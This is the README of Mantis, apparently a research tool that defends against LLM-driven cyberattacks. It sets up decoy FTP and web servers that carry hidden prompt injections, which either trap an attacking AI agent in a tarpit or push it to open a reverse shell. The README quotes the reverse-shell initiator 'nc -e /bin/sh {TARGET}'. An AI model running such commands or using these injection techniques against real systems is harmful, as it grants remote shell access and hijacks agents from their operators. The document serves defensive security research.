<p align="center">
 <img height="150" src="assets/logo.png"> 
</p>

# Project Mantis:  *Hacking Back the AI-Hacker*
## Prompt Injection as a Defense Against LLM-driven Cyberattacks

🔨Working on transforming Mantis from an academic PoC to a full-fledged and robust defensive tool for your assets. 🪚  

⚠️ Until an official release, this code might undergo severe refactoring and breaking updates. ⚠️

#### Next Milestones:

- [x] Multi-threading for decoys
- [ ]  Advanced agent tracking capabilities
- [x]  Web-based decoy
- [ ]  Refactoring Mantis as a Daemon/Controller interface

## Install Mantis

```
pip install -r requirements.txt
```

## Run Mantis with pre-made configurations
Various pre-made configurations are available in the ```./confs``` directory.

### Hack-back
An example of a Mantis configuration file is given in ```./confs/ftp_hackback_rshell.py```. What this configuration means and how you can choose yours will be explained later in this README file. This can be run using the ```mantis_run.py``` script:
```
python mantis_run.py confs.ftp_hackback_rshell
```
Running Mantis with ```confs/ftp_hackback_rshell.py``` will spawn an FTP decoy server with anonymous credentials that aims to trick the attacking LLM-agent into opening a reverse shell via (invisible) prompt injections. When triggered, it spawns a reverse shell listener on the specified port for testing (⚠️ this configuration is not intended for production ⚠️). 


A variation of the above that uses a SQL-Injection-vulnerable-webapp as decoy can be run via:

```
python mantis_run.py confs.web_hackback_rshell
```

In these examples, we use a very simple reverse shell initiator: ```nc -e /bin/sh {TARGET} ...```. This can be changed by altering the variable ```REVERSE_SHELL_INITIATOR``` in the configuration file (e.g., ```confs/ftp_hackback_rshell.py```), where the parameter ```{TARGET}``` is the IP of the host (which is set automatically by Mantis). If you want to automate the attacker's post-exploitation, you can modify or replace the class ```Mantis.Decoys.reverse_shell_listener.ReverseShellListenerTest```. More on how the configuration files work later.

### Tarpit
Another example is ```./confs/ftp_filesystem_tarpit.py```:

```
python mantis_run.py confs.ftp_filesystem_tarpit
```

This starts a fake FTP server with an infinitely deep filesystem and tailored (invisible) prompt injections to keep the attacking LLM agent trapped. The complexity of the tarpit can be set via the ```EXPECTED_NUMBER_OF_DIRECTORIES``` variable in ```./confs/ftp_filesystem_tarpit.py```.

## Create your own configuration
TODO

### Decoys
TODO

## Create your own decoy
TODO

# White paper
A general description of Mantis's internal working is given in this [paper](https://arxiv.org/abs/2410.20911). Follow a description of the material necessary to replicate our evaluation.


## Testing Mantis on a remote machine for evaluation
To simulate the deployment of Mantis on a remote machine (e.g., a HackTheBox CTF) as done in the paper, it is enough to run ```./mantis_start_with_forward_proxy.py``` instead of ```./mantis_start.py```. This main takes two additional arguments:

* *destination_ip*: The IP of the remote machine
* *ports*: List of ports to forward

For instance, to run Mantis on the HackTheBox's CTF *Dancing*, you can run this:
```
python mantis_start_with_forward_proxy.py confs.ftp_hackback_rshell 10.129.70.160 --ports 135 139 445
```

Here ```10.129.70.160``` is the IP assigned by HackTheBox (put there yours), and ```135 139 445``` are the open ports on *Dancing*. (If you use an HackTheBox machine as in the example, remember to start the VPN on your host first.)

Now, attacking your host machine, your attacking the remote machine.


## How to cite Mantis:

```
@misc{pasquini2024hackingaihackerpromptinjection,
      title={Hacking Back the AI-Hacker: Prompt Injection as a Defense Against LLM-driven Cyberattacks}, 
      author={Dario Pasquini and Evgenios M. Kornaropoulos and Giuseppe Ateniese},
      year={2024},
      eprint={2410.20911},
      archivePrefix={arXiv},
      primaryClass={cs.CR},
      url={https://arxiv.org/abs/2410.20911}, 
}
```
